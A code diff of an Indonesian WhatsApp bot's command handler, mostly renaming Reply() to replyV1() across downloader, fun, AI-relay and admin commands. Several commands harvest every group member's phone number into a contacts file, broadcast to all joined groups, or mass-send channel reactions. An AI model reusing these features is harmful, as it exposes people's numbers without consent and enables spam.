+            return replyV1('❌ Link harus berasal dari Facebook atau fb.watch.');
         }
         validFacebookUrl.hash = '';
     } catch {
-        return Reply('❌ URL Facebook tidak valid.');
+        return replyV1('❌ URL Facebook tidak valid.');
     }
     const facebookUrl = validFacebookUrl.toString();
 
@@ -26283,7 +26256,7 @@ case "fb": {
         const ex = exMatch ? exMatch[1] : null
         const to = toMatch ? toMatch[1] : null
 
-        if (!ex || !to) return Reply("❌ Gagal ambil token")
+        if (!ex || !to) return replyV1("❌ Gagal ambil token")
 
         // 🔹 Request ajaxSearch
         const search = await axios.post(
@@ -26310,7 +26283,7 @@ case "fb": {
         )
 
         const data = search.data
-        if (data.status !== "ok") return Reply("❌ Gagal mengambil video")
+        if (data.status !== "ok") return replyV1("❌ Gagal mengambil video")
 
         const $ = cheerio.load(data.data)
 
@@ -26324,7 +26297,7 @@ case "fb": {
             }
         })
 
-        if (!videos.length) return Reply("❌ Video tidak ditemukan")
+        if (!videos.length) return replyV1("❌ Video tidak ditemukan")
 
         // 🔹 pilih kualitas terbaik (biasanya pertama)
         let video = videos[0]
@@ -26336,7 +26309,7 @@ case "fb": {
 
     } catch (e) {
         console.error(e)
-        Reply("❌ Error FDownloader (kemungkinan kena limit / proteksi)")
+        replyV1("❌ Error FDownloader (kemungkinan kena limit / proteksi)")
     }
 }
 break;
@@ -26346,7 +26319,7 @@ case 'instagram': {
   try {
     instagramUrl = normalizeInstagramPostUrl(text);
   } catch (validationError) {
-    return Reply(`❌ ${String(validationError?.message || validationError)}`);
+    return replyV1(`❌ ${String(validationError?.message || validationError)}`);
   }
 
   await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
@@ -26455,13 +26428,13 @@ case 'instagram': {
   } catch (error) {
     console.error('[INSTAGRAM DOWNLOAD ERROR]', error?.stack || error);
     await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
-    return Reply(`❌ Gagal mengunduh media Instagram. Pastikan postingan bersifat publik, lalu coba lagi nanti.\nDetail: ${String(error?.message || error).slice(0, 260)}`);
+    return replyV1(`❌ Gagal mengunduh media Instagram. Pastikan postingan bersifat publik, lalu coba lagi nanti.\nDetail: ${String(error?.message || error).slice(0, 260)}`);
   }
 }
 break
 
 case 'quoteimg': {
-  if (!q) return Reply("Kirim teks quotes-nya dulu ya.\nContoh: .quoteimg jangan nyerah ya, kamu hebat kok")
+  if (!q) return replyV1("Kirim teks quotes-nya dulu ya.\nContoh: .quoteimg jangan nyerah ya, kamu hebat kok")
 
   try {
     const { createCanvas, loadImage } = require('canvas')
@@ -26524,7 +26497,7 @@ case 'quoteimg': {
 
   } catch (err) {
     console.error(err)
-    Reply('Terjadi kesalahan saat mengambil foto profil atau membuat gambar.')
+    replyV1('Terjadi kesalahan saat mengambil foto profil atau membuat gambar.')
   }
 }
 break
@@ -26543,7 +26516,7 @@ case 'supportdev': {
   } catch {}
 
   if (!saweriaUrl) {
-    return Reply('💝 *SUPPORT DEVELOPER XERYUU*\n\nLink Saweria belum dikonfigurasi. Isi `global.saweriaConfig.url` di settings.js atau atur environment `SAWERIA_URL` ke link Saweria resmi kamu, lalu restart bot.\n\nTidak ada saldo pengguna yang dipotong oleh fitur donasi ini.')
+    return replyV1('💝 *SUPPORT DEVELOPER XERYUU*\n\nLink Saweria belum dikonfigurasi. Isi `global.saweriaConfig.url` di settings.js atau atur environment `SAWERIA_URL` ke link Saweria resmi kamu, lalu restart bot.\n\nTidak ada saldo pengguna yang dipotong oleh fitur donasi ini.')
   }
 
   const body = '╭─═⪩ 💝 SUPPORT DEVELOPER ⪨═─╮\n' +
@@ -26576,7 +26549,7 @@ case 'cekgila': {
 
   const kata = komentar[Math.floor(Math.random() * komentar.length)]
 
-  Reply(`🧠 Tes Kegilaan Hari Ini\n\n👤 Nama: ${nama}\n📊 Tingkat Gila: ${persen}%\n🗯️ Komentar: ${kata}`)
+  replyV1(`🧠 Tes Kegilaan Hari Ini\n\n👤 Nama: ${nama}\n📊 Tingkat Gila: ${persen}%\n🗯️ Komentar: ${kata}`)
 }
 break
 
@@ -26594,7 +26567,7 @@ case 'cekwaras': {
     'Jir waras banget, curigua pendukung prabowo'
   ]
   const kata = komentar[Math.floor(Math.random() * komentar.length)]
-  Reply(`🧘 *TES KEWARASAN*\n\n👤 Nama: ${nama}\n📊 Tingkat waras: ${persen}%`)
+  replyV1(`🧘 *TES KEWARASAN*\n\n👤 Nama: ${nama}\n📊 Tingkat waras: ${persen}%`)
 }
 break
 
@@ -26657,12 +26630,12 @@ case 'jodoh': {
       return sendCompatibilityMentionReply(nama1, nama2, m.sender, target)
     }
   }
-  if (!nama1 || !nama2) return Reply(`Contoh: ${prefix}jodoh Darel|Aca\nAtau tag dua orang: ${prefix}jodoh @orang1 @orang2`)
-  return Reply(funMenu.scoreCompatibility(nama1, nama2).text)
+  if (!nama1 || !nama2) return replyV1(`Contoh: ${prefix}jodoh Darel|Aca\nAtau tag dua orang: ${prefix}jodoh @orang1 @orang2`)
+  return replyV1(funMenu.scoreCompatibility(nama1, nama2).text)
 }
 
 case 'serfikat': {
-  if (!text) return Reply(`Kirim perintah ${command} [teks]\n\nContoh: ${command} Hilman`)
+  if (!text) return replyV1(`Kirim perintah ${command} [teks]\n\nContoh: ${command} Hilman`)
 
   try {
     let url = `https://api.sxtream.xyz/maker/yapping?name=${encodeURIComponent(text)}`
@@ -26675,7 +26648,7 @@ case 'serfikat': {
 
   } catch (e) {
     console.error(e)
-    Reply('❌ Terjadi kesalahan saat mengambil gambar.')
+    replyV1('❌ Terjadi kesalahan saat mengambil gambar.')
   }
 }
 break
@@ -26685,7 +26658,7 @@ case "motivasi": {
     let res = await fetch('https://veloria-ui.vercel.app/random/motivasi');
     let data = await res.json();
 
-    if (!data || !data.quotes) return Reply("❌ Gagal mengambil quote.");
+    if (!data || !data.quotes) return replyV1("❌ Gagal mengambil quote.");
 
     let quote = `📜 Motivasi Hari Ini\n\n"${data.quotes}"\n\n📝 _XNALZNOTDEV_`;
 
@@ -26695,20 +26668,20 @@ case "motivasi": {
 
   } catch (e) {
     console.error(e);
-    Reply("❌ Terjadi kesalahan saat mengambil data.");
+    replyV1("❌ Terjadi kesalahan saat mengambil data.");
   }
 }
   break
 
 case "cekgempa": {
-    Reply("Memproses pencarian");
+    replyV1("Memproses pencarian");
     
     try {
         const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
         const data = await response.json();
         
         if (!data || !data.Infogempa || !data.Infogempa.gempa) {
-            return Reply("Gagal mendapatkan data gempa dari BMKG.");
+            return replyV1("Gagal mendapatkan data gempa dari BMKG.");
         }
         
         const gempa = data.Infogempa.gempa;
@@ -26735,14 +26708,14 @@ case "cekgempa": {
         }
     } catch (error) {
         console.log(error);
-        Reply("Terjadi kesalahan saat mengambil data gempa.");
+        replyV1("Terjadi kesalahan saat mengambil data gempa.");
     }
 }
 break
 
 case "savekontak2": {
-if (!isOwner) return Reply(mess.owner)
-if (!m.isGroup) return Reply(mess.group)
+if (!isOwner) return replyV1(mess.owner)
+if (!m.isGroup) return replyV1(mess.group)
 let res = await m.metadata
 const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
 for (let mem of halls) {
@@ -26763,9 +26736,9 @@ const vcard = [
 return vcard }).join("")
 fs.writeFileSync(projectPath('library', 'database', 'contacts.vcf'), vcardContent, "utf8")
 } catch (err) {
-Reply(err.toString())
+replyV1(err.toString())
 } finally {
-if (m.chat !== m.sender) await Reply(`*Berhasil membuat file kontak ✅*
+if (m.chat !== m.sender) await replyV1(`*Berhasil membuat file kontak ✅*
 File kontak telah dikirim ke private chat
 Total *${halls.length}* kontak`)
 await conn.sendMessage(m.sender, { document: fs.readFileSync(projectPath('library', 'database', 'contacts.vcf')), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
@@ -26776,8 +26749,8 @@ await fs.writeFileSync(projectPath('library', 'database', 'contacts.vcf'), "")
 break
 
 case "savekontak": {
-if (!isOwner) return Reply(mess.owner)
-if (!text) return Reply(example("idgrupnya"))
+if (!isOwner) return replyV1(mess.owner)
+if (!text) return replyV1(example("idgrupnya"))
 let res = await conn.groupMetadata(text)
 const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
 for (let mem of halls) {
@@ -26798,9 +26771,9 @@ const vcard = [
 return vcard }).join("")
 fs.writeFileSync(projectPath('library', 'database', 'contacts.vcf'), vcardContent, "utf8")
 } catch (err) {
-Reply(err.toString())
+replyV1(err.toString())
 } finally {
-if (m.chat !== m.sender) await Reply(`*Berhasil membuat file kontak ✅*
+if (m.chat !== m.sender) await replyV1(`*Berhasil membuat file kontak ✅*
 File kontak telah dikirim ke private chat
 Total *${halls.length}* kontak`)
 await conn.sendMessage(m.sender, { document: fs.readFileSync(projectPath('library', 'database', 'contacts.vcf')), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
@@ -26811,16 +26784,16 @@ await fs.writeFileSync(projectPath('library', 'database', 'contacts.vcf'), "")
 break
 
 case "jpm3": {
-if (!isCreator) return Reply(mess.owner)
-if (!q) return Reply(example("teks dengan mengirim foto"))
-if (!/image/.test(mime)) return Reply(example("teks dengan mengirim foto"))
+if (!isCreator) return replyV1(mess.owner)
+if (!q) return replyV1(example("teks dengan mengirim foto"))
+if (!/image/.test(mime)) return replyV1(example("teks dengan mengirim foto"))
 const allgrup = await conn.groupFetchAllParticipating()
 const res = await Object.keys(allgrup)
 let count = 0
 const teks = text
 const jid = m.chat
 const rest = await conn.downloadAndSaveMediaMessage(qmsg)
-await Reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
+await replyV1(`Memproses *jpm* testimoni Ke ${res.length} grup`)
 for (let i of res) {
 if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
 try {
@@ -26853,19 +26826,19 @@ await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berh
 break
 
 case "skiplink": {
-    if (!text) return Reply(`Contoh : .skiplink https://sub4unlock.co/S9oU0`);
-    Reply('wett')
+    if (!text) return replyV1(`Contoh : .skiplink https://sub4unlock.co/S9oU0`);
+    replyV1('wett')
     try {
         let api = `https://fgsi.koyeb.app/api/tools/skip/sub4unlock?apikey=APIKEY&url=${encodeURIComponent(text)}`;
         let { data: json } = await axios.get(api);
 
         if (!json.status || !json.data?.linkGo) {
-            return Reply('Lu masukin url apa tu woy 😂');
+            return replyV1('Lu masukin url apa tu woy 😂');
         }
 
-        await Reply(`${json.data.linkGo}`);
+        await replyV1(`${json.data.linkGo}`);
     } catch (err) {
-        Reply(`Eror kak : ${err.message}`)
+        replyV1(`Eror kak : ${err.message}`)
     }
 };
 break
@@ -26889,51 +26862,51 @@ const fb = async (urlFesnuk) => {
 }
 
 case "fb": {
-    if (!text) return Reply(`Contoh : .fb https://www.facebook.com/share/v/...`)
-    Reply('wett')
+    if (!text) return replyV1(`Contoh : .fb https://www.facebook.com/share/v/...`)
+    replyV1('wett')
     try {
         const { hd, sd } = await fb(text)
         const videoUrl = hd || sd
         await conn.sendFile(m.chat, videoUrl, '_zenwik.mp4', '', m)
     } catch (e) {
-        Reply(`Eror kak : ${e.message}`)
+        replyV1(`Eror kak : ${e.message}`)
     }
 }
 break
 
 case "metaai": {
-    if (!text) return Reply("*Contoh:* .metaai Apa itu JavaScript?");
-    Reply(mess.wait);
+    if (!text) return replyV1("*Contoh:* .metaai Apa itu JavaScript?");
+    replyV1(mess.wait);
     try {
         const apiUrl = `https://api.siputzx.my.id/api/ai/metaai?query=${encodeURIComponent(q)}`;
         const response = await axios.get(apiUrl);
         const data = response.data;
         
         if (data.status && data.data) {
-            await Reply(`*Meta AI*\n\n${data.data}`);
+            await replyV1(`*Meta AI*\n\n${data.data}`);
         } else {
-            Reply("❌ Gagal mendapatkan respons dari Meta AI");
+            replyV1("❌ Gagal mendapatkan respons dari Meta AI");
         }
     } catch (error) {
         console.error("Meta AI Error:", error);
-        Reply(mess.error);
+        replyV1(mess.error);
     }
 }
 break
 
 case 'accall': {
-    if (!m.isGroup) return Reply(mess.group);
+    if (!m.isGroup) return replyV1(mess.group);
     
     const groupMetadata = await conn.groupMetadata(m.chat);
-    if (!groupMetadata.joinApprovalMode) return Reply('Fitur *Join Approval Mode* tidak aktif di grup ini.');
+    if (!groupMetadata.joinApprovalMode) return replyV1('Fitur *Join Approval Mode* tidak aktif di grup ini.');
 
     const pendingList = await conn.groupRequestParticipantsList(m.chat);
-    if (!pendingList || pendingList.length === 0) return Reply('Gak ada member yang perlu di-ACC bos.');
+    if (!pendingList || pendingList.length === 0) return replyV1('Gak ada member yang perlu di-ACC bos.');
 
     const jids = pendingList.map(v => v.jid);
     await conn.groupRequestParticipantsUpdate(m.chat, jids, 'approve');
 
-    Reply(`✅ Berhasil ACC *${jids.length}* member.`);
+    replyV1(`✅ Berhasil ACC *${jids.length}* member.`);
 }
 break;
 
@@ -26944,7 +26917,7 @@ Contoh: ${usedPrefix + command} https://pin.it/xxxxx`;
     try {
         const apiUrl = `https://api.platform.web.id/pinterestdl?q=${encodeURIComponent(text)}`;
         const res = await fetch(apiUrl);
-        if (!res.ok) return Reply(`❌ API Error: ${res.status} ${res.statusText}`);
+        if (!res.ok) return replyV1(`❌ API Error: ${res.status} ${res.statusText}`);
 
         const json = await res.json();
         console.log('📌 PinterestDL JSON:', JSON.stringify(json, null, 2));
@@ -26991,13 +26964,13 @@ Contoh: ${usedPrefix + command} https://pin.it/xxxxx`;
 
     } catch (e) {
         console.error('🚨 PinterestDL Error:', e);
-        Reply('🚨 *Error:* ' + (e.message || 'Terjadi kesalahan saat mengunduh media.'));
+        replyV1('🚨 *Error:* ' + (e.message || 'Terjadi kesalahan saat mengunduh media.'));
     }
 };
 break
 
 case "rch2": {
-    if (!text) return Reply("Contoh:\n.reactch https://whatsapp.com/channel/xxx/123 ❤️XnalzNotDev\n.reactch https://whatsapp.com/channel/xxx/123 ❤️XnalzNotDev|5");
+    if (!text) return replyV1("Contoh:\n.reactch https://whatsapp.com/channel/xxx/123 ❤️XnalzNotDev\n.reactch https://whatsapp.com/channel/xxx/123 ❤️XnalzNotDev|5");
 
     const hurufGaya = {
         a: '🅐', b: '🅑', c: '🅒', d: '??', e: '🅔', f: '🅕', g: '🅖',
@@ -27013,16 +26986,16 @@ case "rch2": {
     const link = args[0];
 
     if (!link.includes("https://whatsapp.com/channel/")) {
-        return Reply("Link tidak valid!\nContoh: .reactch https://whatsapp.com/channel/xxx/idpesan ❤️XnalzNotDev|3");
+        return replyV1("Link tidak valid!\nContoh: .reactch https://whatsapp.com/channel/xxx/idpesan ❤️XnalzNotDev|3");
     }
 
     const channelId = link.split('/')[4];
     const rawMessageId = parseInt(link.split('/')[5]);
-    if (!channelId || isNaN(rawMessageId)) return Reply("Link tidak lengkap!");
+    if (!channelId || isNaN(rawMessageId)) return replyV1("Link tidak lengkap!");
     const offset = parseInt(offsetStr?.trim()) || 1;
     const teksNormal = args.slice(1).join(' ');
     const teksTanpaLink = teksNormal.replace(link, '').trim();
-    if (!teksTanpaLink) return Reply("Masukkan teks/emoji untuk direaksikan.");
+    if (!teksTanpaLink) return replyV1("Masukkan teks/emoji untuk direaksikan.");
     const emoji = teksTanpaLink.toLowerCase().split('').map(c => {
         if (c === ' ') return '―';
         return hurufGaya[c] || c;
@@ -27040,19 +27013,19 @@ case "rch2": {
                 failed++;
             }
         }
-        Reply(`✅ Berhasil kirim reaction *${emoji}* ke ${success} pesan di channel *${metadata.name}*\n❌ Gagal di ${failed} pesan`);
+        replyV1(`✅ Berhasil kirim reaction *${emoji}* ke ${success} pesan di channel *${metadata.name}*\n❌ Gagal di ${failed} pesan`);
     } catch (err) {
         console.error(err);
-        Reply("❌ Gagal memproses permintaan!");
+        replyV1("❌ Gagal memproses permintaan!");
     }
 }
 break
 
 case 'kontol': {
     try {
-        if (!text) return Reply('Nn?')
+        if (!text) return replyV1('Nn?')
         const aiProxyToken = getXeryuuPrivateKey('aiProxyBearer', 'XERYUU_AI_PROXY_TOKEN', ['aiProxyToken']);
-        if (!aiProxyToken) return Reply('⚙️ API GPT belum dikonfigurasi. Isi XERYUU_AI_PROXY_TOKEN atau apiKeys.aiProxyBearer di authen.js lokal.');
+        if (!aiProxyToken) return replyV1('⚙️ API GPT belum dikonfigurasi. Isi XERYUU_AI_PROXY_TOKEN atau apiKeys.aiProxyBearer di authen.js lokal.');
         
         
         let { data } = await axios.post(
@@ -27076,25 +27049,25 @@ case 'kontol': {
             }
         )
         
-        Reply(data.choices[0].message.content)
+        replyV1(data.choices[0].message.content)
     } catch (e) {
-        Reply(e.message)
+        replyV1(e.message)
     }
 }
 break
 
 case 'capcut': {
   const capcutInput = String(args[0] || text || '').trim().split(/\s+/)[0] || '';
-  if (!capcutInput) return Reply(`Contoh: ${prefix}capcut https://www.capcut.com/tv2/xxxxx`);
+  if (!capcutInput) return replyV1(`Contoh: ${prefix}capcut https://www.capcut.com/tv2/xxxxx`);
   let capcutUrl;
   try {
     capcutUrl = new URL(/^https?:\/\//i.test(capcutInput) ? capcutInput : `https://${capcutInput}`);
     const host = capcutUrl.hostname.toLowerCase().replace(/^www\./, '');
     if (!['capcut.com'].some(domain => host === domain || host.endsWith(`.${domain}`))) {
-      return Reply('❌ Link harus berasal dari capcut.com.');
+      return replyV1('❌ Link harus berasal dari capcut.com.');
     }
   } catch {
-    return Reply('❌ URL CapCut tidak valid.');
+    return replyV1('❌ URL CapCut tidak valid.');
   }
 
   try {
@@ -27137,24 +27110,24 @@ case 'capcut': {
   } catch (error) {
     console.error('[CAPCUT DOWNLOAD ERROR]', error?.stack || error);
     await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
-    return Reply(`❌ Gagal mengunduh video CapCut. ${String(error?.message || error).slice(0, 240)}`);
+    return replyV1(`❌ Gagal mengunduh video CapCut. ${String(error?.message || error).slice(0, 240)}`);
   }
 }
 break
 case 'tovn': case 'toptt': case 'tovoice': {
     try {
         const quotedMsg = m.quoted?.message;
-        if (!quotedMsg) return Reply('⚠️ Reply audio atau dokumen audio yang ingin dijadikan PTT!');
+        if (!quotedMsg) return replyV1('⚠️ Reply audio atau dokumen audio yang ingin dijadikan PTT!');
 
         const isAudio = quotedMsg.audioMessage;
         const isDocumentAudio = quotedMsg.documentMessage?.mimetype?.startsWith('audio/');
 
         if (!isAudio && !isDocumentAudio) 
-            return Reply(`⚠️ Reply audio atau dokumen audio dengan caption ${prefix + command}`);
+            return replyV1(`⚠️ Reply audio atau dokumen audio dengan caption ${prefix + command}`);
 
         const buffer = await m.quoted.download();
         if (!buffer || buffer.length === 0) 
-            return Reply('❌ Gagal download audio.');
+            return replyV1('❌ Gagal download audio.');
 
         await conn.sendMessage(m.chat, {
             audio: buffer,
@@ -27162,36 +27135,36 @@ case 'tovn': case 'toptt': case 'tovoice': {
             ptt: true
         }, { quoted: m });
 
-        Reply('✅ Audio berhasil dikonversi menjadi PTT!');
+        replyV1('✅ Audio berhasil dikonversi menjadi PTT!');
     } catch (err) {
         console.error(err);
-        Reply('❌ Terjadi kesalahan saat mengkonversi audio menjadi PTT.');
+        replyV1('❌ Terjadi kesalahan saat mengkonversi audio menjadi PTT.');
     }
 }
 break
 case 'conves': {
-    if (!text) return Reply('Format salah!\nContoh: .conves 6281234567890 sebener nya aku suka kamu');
+    if (!text) return replyV1('Format salah!\nContoh: .conves 6281234567890 sebener nya aku suka kamu');
 
     // Pisahkan nomor dan pesan
     let args = text.split(' ');
     let number = args.shift(); // ambil nomor
     let pesan = args.join(' '); // gabungkan sisanya sebagai pesan
 
-    if (!number || !pesan) return Reply('Format salah!\nContoh: .conves 6281234567890 halo sayang');
+    if (!number || !pesan) return replyV1('Format salah!\nContoh: .conves 6281234567890 halo sayang');
 
     // pastikan nomor memakai format WhatsApp
     if (!number.endsWith('@s.whatsapp.net')) number = number + '@s.whatsapp.net';
 
     try {
         await conn.sendMessage(number, { text: pesan });
-        Reply(`Berhasil mengirim pesan ke ${number}`);
+        replyV1(`Berhasil mengirim pesan ke ${number}`);
     } catch (err) {
-        Reply(`Gagal mengirim pesan: ${err.message}`);
+        replyV1(`Gagal mengirim pesan: ${err.message}`);
     }
 }
 break
 case 'ytmp2': {
- try { if (!args[0]) return Reply(`Gunakan: ${usedPrefix + command} <url>`)
+ try { if (!args[0]) return replyV1(`Gunakan: ${usedPrefix + command} <url>`)
  
 await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
  
@@ -27199,7 +27172,7 @@ let url = `https://www.sankavollerei.com/download/ytmp3?apikey=planaai&url=${enc
 let res = await axios.get(url)
 let json = res.data
  
-if (!json.status) return Reply(`❌ Gagal mengambil data dari API`)
+if (!json.status) return replyV1(`❌ Gagal mengambil data dari API`)
  
 let { title, thumbnail, download, duration } = json.result
  
@@ -27209,14 +27182,14 @@ await conn.sendMessage(m.chat, {
   fileName: `${title}.mp3`,
 }, { quoted: m })
  
-} catch (err) { Reply(`❌ Error\nLogs error : ${err.message}`) } }
+} catch (err) { replyV1(`❌ Error\nLogs error : ${err.message}`) } }
 break
 
 case 'ah': {
-  if (!text) return Reply(`Example: ${prefix + command} Lagu sad`);
+  if (!text) return replyV1(`Example: ${prefix + command} Lagu sad`);
   try {		
     let search = await yts(`${text}`);
-    if (!search || search.all.length === 0) return Reply(`*Lagu tidak ditemukan!* ☹️`);
+    if (!search || search.all.length === 0) return replyV1(`*Lagu tidak ditemukan!* ☹️`);
     let { videoId, image, title, views, duration, author, ago, url, description } = search.all[0];
     let caption = `「 *YOUTUBE PLAY* 」\n\n🆔 ID : ${videoId}\n💬 Title : ${title}\n📺 Views : ${views}\n⏰ Duration : ${duration.timestamp}\n▶️ Channel : ${author.name}\n📆 Upload : ${ago}\n🔗 URL Video : ${url}`;
     
@@ -27244,15 +27217,15 @@ case 'ah': {
     }, { quoted: m });
   } catch (err) {
     console.error(err);
-    Reply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
+    replyV1(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
   }
 }
 break
 case 'google': {
-              if (!text) return Reply(`Contoh: ${cmd} lyrra`)
+              if (!text) return replyV1(`Contoh: ${cmd} lyrra`)
               const apiKey = getXeryuuPrivateKey('googleCustomSearchApiKey', 'GOOGLE_CUSTOM_SEARCH_API_KEY', ['googleCustomSearchApiKey', 'googleApiKey'])
               const cx = getXeryuuPrivateKey('googleCustomSearchCx', 'GOOGLE_CUSTOM_SEARCH_CX', ['googleCustomSearchCx', 'googleSearchCx'])
-              if (!apiKey || !cx) return Reply('⚙️ Google Search belum dikonfigurasi. Isi GOOGLE_CUSTOM_SEARCH_API_KEY dan GOOGLE_CUSTOM_SEARCH_CX atau apiKeys di authen.js lokal.');
+              if (!apiKey || !cx) return replyV1('⚙️ Google Search belum dikonfigurasi. Isi GOOGLE_CUSTOM_SEARCH_API_KEY dan GOOGLE_CUSTOM_SEARCH_CX atau apiKeys di authen.js lokal.');
               const query = text
               const url = `https://www.googleapis.com/customsearch/v1?q=${encodeURIComponent(query)}&key=${apiKey}&cx=${cx}`
               fetch(url).then(response => response.json()).then(data => {
@@ -27263,21 +27236,21 @@ case 'google': {
                     teks += `• Deskripsi: ${item.snippet}\n`
                     teks += `• Link: ${item.link}\n\n`
                   })
-                  Reply(teks)
+                  replyV1(teks)
                 } else {
-                  return Reply('Tidak ada hasil yang ditemukan')
+                  return replyV1('Tidak ada hasil yang ditemukan')
                 }
               }).catch(err => {
-                return Reply('Terjadi kesalahan')
+                return replyV1('Terjadi kesalahan')
               })
             }
             break
 case 'playch': {
-    if (!text) return Reply('⚠️ Masukkan ID saluran dan judul lagu!\nFormat: .playch idsaluran | judul lagu');
+    if (!text) return replyV1('⚠️ Masukkan ID saluran dan judul lagu!\nFormat: .playch idsaluran | judul lagu');
 
     // Pisahkan ID saluran dan judul
     let [channelId, ...queryParts] = text.split('|').map(v => v.trim());
-    if (!channelId || queryParts.length === 0) return Reply('⚠️ Format salah! Gunakan: .playch idsaluran | judul lagu');
+    if (!channelId || queryParts.length === 0) return replyV1('⚠️ Format salah! Gunakan: .playch idsaluran | judul lagu');
 
     let query = queryParts.join(' ');
 
@@ -27289,7 +27262,7 @@ case 'playch': {
         // Ambil lagu dari API
         let apiUrl = `https://api.alvianuxio.eu.org/api/play?query=${encodeURIComponent(query)}&apikey=kayzuMD&format=mp3`;
         let { data } = await axios.get(apiUrl, { timeout: 15000 });
-        if (!data?.data?.response) return Reply('❌ Lagu tidak ditemukan!');
+        if (!data?.data?.response) return replyV1('❌ Lagu tidak ditemukan!');
 
         let song = data.data.response;
 
@@ -27303,7 +27276,7 @@ case 'playch': {
         });
 
         const audioBuffer = Buffer.from(audioResponse.data);
-        if (!audioBuffer || audioBuffer.length === 0) return Reply('❌ Gagal download audio!');
+        if (!audioBuffer || audioBuffer.length === 0) return replyV1('❌ Gagal download audio!');
 
         // Kirim langsung ke saluran WA
         await conn.sendMessage(channelId, {
@@ -27317,17 +27290,17 @@ case 'playch': {
         await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
     } catch (err) {
         console.error(err);
-        Reply('❌ Terjadi kesalahan saat mengirim audio ke saluran.');
+        replyV1('❌ Terjadi kesalahan saat mengirim audio ke saluran.');
         await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
     }
 }
 break
 case 'upch': case 'kiirmkech': {
-    if (!isCreator) return Reply(mess.owner);
+    if (!isCreator) return replyV1(mess.owner);
 
     // Ambil newsletter dari parameter
     const targetChannel = text?.trim(); 
-    if (!targetChannel) return Reply(`Gunakan: *${prefix}upch 131xxxx@newsletter* + Reply media/audio/teks`);
+    if (!targetChannel) return replyV1(`Gunakan: *${prefix}upch 131xxxx@newsletter* + Reply media/audio/teks`);
 
     const isQuoted = quoted && quoted.message;
     const contentText = !isQuoted ? text?.split(' ').slice(1).join(' ') : ''; 
@@ -27335,7 +27308,7 @@ case 'upch': case 'kiirmkech': {
 
     // <<< CEK DULU SEBELUM REACT
     if (!isQuoted && !contentText) {
-        return Reply(`Balas audio/media atau tulis teks agar bot bisa mengirim ke newsletter ${targetChannel}`);
+        return replyV1(`Balas audio/media atau tulis teks agar bot bisa mengirim ke newsletter ${targetChannel}`);
     }
 
     // React jam 🕐 kalau ada konten
@@ -27410,11 +27383,11 @@ case 'ad': {
 
     if (isPrivate) {
         if (!allowedPrivate) {
-            return Reply('❌ Anti Delete chat pribadi hanya tersedia untuk user yang terdaftar di pengaturan.')
+            return replyV1('❌ Anti Delete chat pribadi hanya tersedia untuk user yang terdaftar di pengaturan.')
         }
 
         if (!['on', 'off', 'status'].includes(args)) {
-            return Reply(
+            return replyV1(
 `🗑️ ANTI DELETE PRIVATE\n\n` +
 `Gunakan:\n` +
 `• ${prefix}antidelete on\n` +
@@ -27425,24 +27398,24 @@ case 'ad': {
 
         global.db.privateAntiDelete ??= {}
         if (args === 'status') {
-            return Reply(
+            return replyV1(
                 `🗑️ ANTI DELETE PRIVATE\n\nStatus: ${global.db.privateAntiDelete[m.chat] === true ? '🟢 ON' : '🔴 OFF'}`
             )
         }
 
         global.db.privateAntiDelete[m.chat] = args === 'on'
         if (args === 'off') require('./library/antidelete').clearChat(m.chat)
-        return Reply(
+        return replyV1(
             args === 'on'
                 ? '✅ Anti Delete private berhasil diaktifkan untuk chat ini.'
                 : '🔴 Anti Delete private berhasil dimatikan dan cache chat ini dibersihkan.'
         )
     }
 
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
 
     if (!['on', 'off', 'status'].includes(args)) {
-        return Reply(
+        return replyV1(
 `🗑️ ANTI DELETE GROUP\n\n` +
 `Gunakan:\n` +
 `• ${prefix}antidelete on\n` +
@@ -27453,14 +27426,14 @@ case 'ad': {
 
     global.db.groups[m.chat] ??= {}
     if (args === 'status') {
-        return Reply(
+        return replyV1(
             `🗑️ ANTI DELETE GROUP\n\nStatus: ${global.db.groups[m.chat].antidelete === true ? '🟢 ON' : '🔴 OFF'}`
         )
     }
 
     global.db.groups[m.chat].antidelete = args === 'on'
     if (args === 'off') require('./library/antidelete').clearChat(m.chat)
-    return Reply(
+    return replyV1(
         args === 'on'
             ? '✅ Anti Delete grup berhasil diaktifkan.'
             : '🔴 Anti Delete grup berhasil dimatikan dan cache grup ini dibersihkan.'
@@ -27470,12 +27443,12 @@ break
 
 case 'kiirmkech': case 'upch2':
 case 'HH': {
-    if (!isCreator) return Reply(mess.owner);
+    if (!isCreator) return replyV1(mess.owner);
     const Danzosender = m.key.remoteJid;
     const name = conn.getName ? await conn.getName(Danzosender) : 'kamu';
     const targetChannel = targetChannelData.id;   
     if (!text && !(quoted && quoted.message)) {
-        return Reply(`Cara penggunaan ${prefix}upch:\n\n` +
+        return replyV1(`Cara penggunaan ${prefix}upch:\n\n` +
             `1. Balas media (foto/video/sticker/audio/dokumen) + ketik ${prefix}upch untuk kirim media ke channel.\n\n` +
             `Note:\n` +
             `Sebelum pakai, pastikan sudah set target channel pakai perintah ${prefix}setch 120xxxx@newsletter\n\n` +
@@ -27599,7 +27572,7 @@ try {
 } catch (e) {
     // Jangan biarkan kegagalan provider AI menjadi unhandled/rejected command.
     xnalzMemory[user].pop()
-    return Reply(`⚠️ AI sedang tidak tersedia. ${e?.message || 'Coba lagi beberapa saat.'}`)
+    return replyV1(`⚠️ AI sedang tidak tersedia. ${e?.message || 'Coba lagi beberapa saat.'}`)
 }
 
